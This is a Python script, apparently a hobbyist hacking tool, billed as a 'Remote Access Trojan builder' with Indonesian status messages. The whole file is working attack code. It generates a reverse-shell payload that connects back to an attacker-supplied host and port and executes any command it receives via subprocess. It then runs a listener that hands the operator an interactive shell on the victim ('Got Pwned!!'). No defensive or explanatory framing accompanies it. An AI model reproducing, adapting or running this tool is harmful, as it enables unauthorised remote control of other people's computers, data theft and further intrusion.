import sys
import time
import socket

class main:
   def __init__(self,host,port):
       self.host = str(host)
       self.port = int(port)
       self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   def running_text(self,text):
       for i in text + '\n':
           sys.stdout.write(i)
           sys.stdout.flush()
           time.sleep(0.02)
   def Builder(self):
       code = f'''import socket
import subprocess

rhost = "{self.host}"
rport = {self.port}
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.connect((rhost,rport))
while True:
   command = server.recv(1024).decode()
   if not command:
       break
   elif command == "exit":
       break
   else:
       execute = subprocess.getoutput(command)
       server.send(execute.encode().strip())
server.close()'''
       with open('code.py','w') as coder:
            coder.write(code)
       self.running_text('Malware Berhasil dibuat!!')
class sidabutarxcode(main):
   def malware_server(self):
       self.server.bind((self.host,self.port))
       self.server.listen(1)
       self.running_text(f'Server Malware Berjalan di {self.host}:{self.port}')
       client,address = self.server.accept()
       self.running_text(f'Terkoneksi ke {address}!!')
       self.running_text('Got Pwned!! ')
       client.send('whoami'.encode())
       if client.recv(1024).decode() == 'root':
           while True:
              try:
                 root = input('root@fucked:~# ')
                 if root == 'exit':
                     print('exploit di hentikan!!')
                     break
                 else:
                     client.send(root.encode())
                     print(client.recv(1024).decode())
              except (socket.error,ConnectionResetError) as E:
                 self.running_text(f'Koneksi ke target bermasalah!!:{E}')
           client.close()
       else:
           while True:
              try:
                 user = input('user@fucked:~$ ')
                 if user == 'exit':
                     print('exploit di hentikan!!')
                     break
                 else:
                     client.send(user.encode())
                     print(client.recv(1024).decode())
              except (socket.error,ConnectionResetError) as E:
                 self.running_text(f'Koneksi ke target bermasalah!!:{E}')
           client.close()
   def running_program(self):
       self.Builder()
       self.malware_server()
if __name__=='__main__':
   def running(text):
       for w in text + '\n':
           sys.stdout.write(w)
           sys.stdout.flush()
           time.sleep(0.02)
   ascii_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆ 	MALWARE RAT (REMOTE ACCESS TROJAN)
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿  BUILDER V 1.0
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟  DEVELOPED:ZEUSSEC1337
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀
"""
   running(ascii_art)
   lhost = input('LHOST: ')
   lport = input('LPORT: ')
   sidabutarxcode(lhost,lport).running_program()
